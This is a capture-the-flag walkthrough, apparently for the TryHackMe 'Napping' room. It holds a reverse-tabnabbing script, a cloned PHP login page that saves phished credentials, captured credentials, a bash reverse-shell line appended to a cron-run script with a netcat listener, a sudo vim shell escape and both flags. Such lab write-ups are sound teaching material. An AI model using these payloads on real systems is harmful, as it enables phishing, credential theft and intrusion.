# Napping
nmap scan

```abap
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Going to the website we have a login page. Below we can sign up and make a account so thats what I did. After that it took us to this page right here

<img width="1840" height="969" alt="Screenshot From 2025-09-10 16-13-04" src="https://github.com/user-attachments/assets/2b489d76-463b-40e9-8bb3-31994990481c" />


Reverse Tab nabbing is when an attacker can execute a code on a currently active tab to load a page by refreshing the inactive source inactive tab. The attacker can serve up a page specifically designed to collect PII from the victim, also known as phishing.

How does it work?

The attacker places a malicious link on a victim's website
The user clicks on the bad link on the victim's website and is taken to a new tab with a malicious script
The inactive tab is then refreshed and loads a cloned copy of the login page controlled by the attacker.
Users enter credentials and is redirected back to the real victim website
More information on how to execute reverse tab nabbing is available on OWASP and Hack Tricks. While most updated browsers do not allow a JavaScript tab nabbing, if an attacker can control an HREF argument in a <a> tag with attributes target=”_blank,” a malicious JavaScript be on the destination site that can control the source tab

In this scenario, Tab Nabbing can be used to hijack the system administrators tab when they review the submitted link. The hijacked tab will appear the user will need to sign back in using a cloned template.

<img width="1840" height="969" alt="Screenshot From 2025-09-10 21-24-32" src="https://github.com/user-attachments/assets/31e6323b-2628-4b34-aa01-b440c28928aa" />

https://book.hacktricks.wiki/en/pentesting-web/reverse-tab-nabbing.html

This can be simulated by creating a page with embedded JavaScript to execute when the website admin clicks on the link and opens the page in a new tab. The javascript code will hijack the tab and redirect it to the phishing login page on the attack book.

Make index.php

```abap
<!DOCTYPE html>
<html>
 <body>
  <script>
	  window.opener.location = "http://machine_ip:8000/login.html";
  </script>
 </body>
</html>
```

The hijacked tab will then be redirected to the login page cloned from the login page found in the admin directory during DirBuster enumeration. When the unsuspecting user signs back in, the victim’s username and password are captured and posted to the attacking server using PHP

Copy admin page login source code

```abap
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<?php
        if(isset($_POST['username'])){
                file_put_contents('creds.txt', file_get_contents('php://input'));
        }

?>

<body>
    <div class="wrapper">
        <h2>Admin Login</h2>
        <p>Please fill in your credentials to login.</p>

        <form action="/admin/login.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <br>
        </form>
    </div>
</body>

```

Once the required ingredients are in place, we can start a PHP or Python listener, submit the link, and wait for a few moments for the admin to click on the link. The JavaScript will be executed when the admin clicks the link and redirect the original tab to the cloned login page.

<img width="1840" height="969" alt="Screenshot From 2025-09-10 22-56-41" src="https://github.com/user-attachments/assets/562a7ac2-301f-464a-8afd-5c1ab4563d20" />

After that we can find in wireshark a login data, and after try we have access to ssh.

<img width="1840" height="969" alt="Screenshot From 2025-09-10 22-56-51" src="https://github.com/user-attachments/assets/7a5a0998-b1a9-425d-8782-3051ee8ecd21" />

```abap
username=daniel&password=C%40ughtm3napping123
```

We first decode the password and then get the real password

```abap
C@ughtm3napping123
```

Now we login to the admin page with these credentials

After running pspy I noticed that a cron job was executing `/home/adrian/query.py` every minute as adrian. Since the script was writable, I appended a reverse shell one-liner directly into it so that when the cron job triggered, it would execute my payload. I used a simple Python import with `os.system` to call bash and connect back to my machine on port 4444. On my attacker box I set up a netcat listener with `nc -lvnp 4444` and waited. As soon as the cron job fired on the next minute mark, the script executed my injected code and I caught a shell as adrian. This gave me the next level of access by taking advantage of a writable cron-executed Python script.

```abap
echo 'import os; os.system("bash -c '\''bash -i >& /dev/tcp/10.201.22.32/4444 0>&1'\''")' >> /home/adrian/query.py 
# On your box: 
nc -lvnp 4444 
# wait up to 60s for the cron tick
```

Flag 1 

> THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}
> 

Now to get root access we do `sudo -l`

```abap
adrian@ip-10-201-84-104:~$ sudo -l
Matching Defaults entries for adrian on ip-10-201-84-104:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on ip-10-201-84-104:
    (root) NOPASSWD: /usr/bin/vim
```

https://gtfobins.github.io/gtfobins/vim/

```abap
File read
It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

vim file_to_read
```

run this command

```abap
sudo vim -c ':!/bin/sh'
```

Flag 2 

> THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}
>
